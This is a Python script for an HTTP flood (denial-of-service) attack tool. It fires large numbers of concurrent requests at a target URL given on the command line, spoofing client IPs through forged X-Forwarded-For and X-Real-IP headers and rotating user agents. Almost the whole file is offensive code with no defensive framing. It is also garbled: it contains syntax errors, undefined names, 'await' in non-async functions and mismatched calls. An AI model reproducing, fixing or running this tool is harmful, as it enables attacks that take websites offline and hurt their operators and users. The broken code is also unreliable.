import asyncio
import random
import string
import time
from typing import List, Optional
import aiohttp
import requests
import re
import logging
import shutil
import sys
import signal
# Configure logger
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)
class CliAttacker:
    def __init__(self, target_url: str, num_requests: int):
        self.target_url = target_url
        self.num_requests = num_requests
        self.max_concurrent = 250
        self.success_count = 0
        self.fail_count = 0
        self.start_time = None
    async def log(self, message: str) -> None:
        if self.start_time is not None:
            elapsed = time.time() - self.start_time
            rate = self.success_count / elapsed if elapsed > 0 else 0
            logger.info(f"Requests: {self.success_count} | Rate: {rate:.1f}/s | {message}")
        else:
            logger.info(message)
    async def fetch_ip_addresses(self, url: str) -> List[str]:
        try:
            async with aiohttp.ClientSession() as session:
                response = await session.get(url)
                text = await response.text()
                return re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b', text)
        except Exception as e:
            logger.error(f"Failed to fetch IPs from {url}: {str(e)}")
            return []
    async def get_random_ip(self) -> str:
        if len(self proxy_list) < 1000:
            self.proxy_list.extend([f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(1000)])
        return random.choice(self.proxy_list)
    async def send_request(self, session: aiohttp.ClientSession, ip_address: str, timeout_seconds: float = 3.0) -> None:
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address,
            "X-Real-IP": ip_address,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }
        
        try:
            async with session.get(self.target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=timeout_seconds)) as response:
                self.success_count += 1
                if self.success_count % 50 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.success_count / elapsed if elapsed > 0 else 0
                    logger.info(f"Requests: {self.success_count} | Rate: {rate:.1f}/s | IP: {ip_address}")
        except Exception as e:
            self.fail_count += 1
            logger.error(f"Request failed for IP: {ip_address}: {str(e)}")
    async def attack(self):
        self.start_time = time.time()
        logger.info("Fetching proxy list...")
        
        self.proxy_list = await self._fetch_proxies()
        if not self.proxy_list:
            random_ips = [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(2000)]
            self.proxy_list = random_ips.copy()
        logger.info(f"Loaded {len(self.proxy_list)} IPs | Starting attack...")
        ip_gen = iter(self.proxy_list)
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self._send_request(ip, session) for _ in range(self.max_concurrent)]
            await asyncio.gather(*tasks)
    def _fetch_proxies(self) -> List[str]:
        proxies = []
        for url in proxy_sources:
            ips = await self.fetch_ip_addresses(url)
            proxies.extend(ips)
        
        if len(proxies) < 1000:
            proxies.extend([f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(1000)])
        return proxies
    def _send_request(self, session: aiohttp.ClientSession) -> str:
        ip_address = next(self.proxy_list)
        try:
            async with self._get_session() as session:
                response = await session.get(self.target_url, timeout=3)
                if response.status == requests.codes.ok:
                    return ip_address
                else:
                    logger.warning(f"Request to {self.target_url} failed for IP: {ip_address}")
                    return None
        except Exception as e:
            logger.error(f"Error in request processing: {e}")
            return None
    def _get_session(self) -> aiohttp.ClientSession:
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, ssl=False)) as session:
                return session
        except Exception as e:
            logger.error(f"Failed to get session: {e}")
            raise
    def run(self):
        asyncio.run(self.attack())
def print_banner():
    columns = shutil.get_terminal_size().columns
    banner = r"""
    
█▄░█ █░█ █░░ █░░ █▀ █▀▀ █▀▀
█░▀█ █▄█ █▄▄ █▄▄ █ ██▄ █▄▄
█▀█ █░█ █ █░░ █ █▀█ █▀█ █ █▄░█ █▀▀ █▀
█▀▀ █▀█ █ █▄ █ █▀▀ █▀▀ █ █░▀█ ██▄ ▄█
     Rebuild By:, Anos Kurz """
    for line in banner.splitlines():
        print(f"{Fore.RED}{line.center(columns)}{Fore.RESET}")
if __name__ == "__main__":
    try:
        target_url = sys.argv[1]
        num_requests = int(sys.argv[2])
        if not target_url.startswith(('http://', 'https://')):
            target_url = f"http://{target_url}"
        logger.info(f"Starting attack on {target_url} with {num_requests} requests")
        
        attacker = CliAttacker(target_url, num_requests)
        attacker.run()
    except IndexError:
        print_banner()
        print("Please provide a valid target URL and number of requests as arguments.")
